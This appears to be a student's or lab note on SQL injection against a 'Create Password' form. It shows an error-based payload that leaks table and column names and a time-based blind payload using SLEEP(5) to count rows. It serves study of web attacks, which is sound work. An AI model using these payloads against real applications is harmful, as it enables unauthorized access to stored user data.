Sql injection for create Password
1
* In Create Password we can type as user input in Password ' OR 1/0 --'
* So this an sql error (devision by 0) and so it will echo it as the following:
ERROR: Could not execute query: INSERT INTO passwords_for_users (user_id, note, url_name, password) VALUES (1, 'billal', 'billal', '' OR 1/0 --''). Division by 0
* so now the attacker knows the table name, names of columns and he can generate more powerful sql injection attacks using those inforamtion
this is an Error sql injection

ff' OR ((SELECT COUNT(*) FROM passwords_for_users) > 9) AND SLEEP(5) ";#
this will give us information about how many rows on that sepcific table, if it is true the app will take longer time
to refresh (5 seconds) if it is false it will it will run immediately, we can try it for different values until get the
right one or we can write a script for it to automate things
